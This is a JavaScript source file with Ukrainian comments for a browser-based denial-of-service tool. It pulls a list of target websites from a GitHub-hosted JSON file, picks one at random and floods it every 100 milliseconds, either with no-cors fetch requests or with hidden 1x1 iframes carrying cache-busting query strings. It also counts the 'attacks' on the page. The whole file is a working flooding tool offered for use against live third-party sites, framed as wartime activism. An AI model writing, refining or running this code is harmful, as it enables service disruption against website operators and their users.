// Звідси будуть завантажуватись цілі
const targetSource = 'https://raw.githubusercontent.com/opengs/uashieldtargets/test/sites.json'


// Функції для керування документом
let frameDiv = $("#frame")

const getId = (id) => document.getElementById(id) // Не дуже хочу використовувати Jquery
let attacks = getId("attacks")


// Функції рандому
const add_count = () => attacks.textContent++ // Кількість атак

const randint = (num) => Math.floor(Math.random() * num) // Рандомне ціле число

const getRandomArbitrary = (min, max) => Math.random() * (max - min) + min

async function getSalt(target) {
	// Сіль з нашого Криму

	const now = (new Date()).getTime();
	return target + '?' + now + getRandomArbitrary(100_000, 1_000_000);
}


// Завантаження цілей
async function getTarget() {
    targets = await fetch(targetSource);
    data = await targets.json();

    targets = [];

    // Фільтрування цілей
    for (var i = 0; i < data.length; i++) {
        if (['post', 'get'].includes(data[i].method)) {
        	targets.push(data[i])
        }
    };

    return targets[randint(targets.length)] // Рандомна ціль
}


const Frames = {
	async draw(target, id) {
		const framediv = frameDiv;
		$("<iframe>", {
			src: target,
			id: "frame" + id,
			frameborder: 0,
			width: 1,
			height: 1
		}).appendTo(framediv);
	},
	clear() {frameDiv.empty()}
}


// Відображення цілі та методу атаки
let targetField = getId("target")
let methodField = getId("method")

setTarget = (target) => {
	targetField.textContent = target.page;
    methodField.textContent = target.method.toUpperCase();
}


class Doser {
    attack = false; // Status of attack
    interval;

    async start(isFetch=false) {
    	this.attack = true;

        // Запуск атаки

        btn.textContent = "Стоп";
        let target = await getTarget();

        console.log(target);
        setTarget(target);

        this.interval = setInterval(isFetch ? async function () {
            // Запити

            await fetch([target.page], {
	            method: target.method,
	            mode: 'no-cors',
				referrerPolicy: 'no-referrer'
	        }).then(() => {
	            // Після запиту

	            console.log("Ok!");
	            add_count();
	        })
        } : async function () {
        	let targett = await getSalt(target.page); // Беремо сіль з нашого криму

        	// Надсилання запиту на сайт за допомогою iframe
        	await Frames.draw(targett, randint(0, 100_000));
        	console.log(targett);

        	add_count();

        	if (getId("frame").childElementCount > 200) {Frames.clear()};
        }, 100);
    };
    stop() {
    	this.attack = false;
    	clearInterval(this.interval);
    	Frames.clear()
    	btn.textContent = "Старт!";
    };
}



let btn = getId("button")
Doser = new Doser // Ініціалізація воркера

btn.addEventListener('click', (e) => {
	e.preventDefault();

	!Doser.attack ? Doser.start() : Doser.stop();
})

// Слава Україні!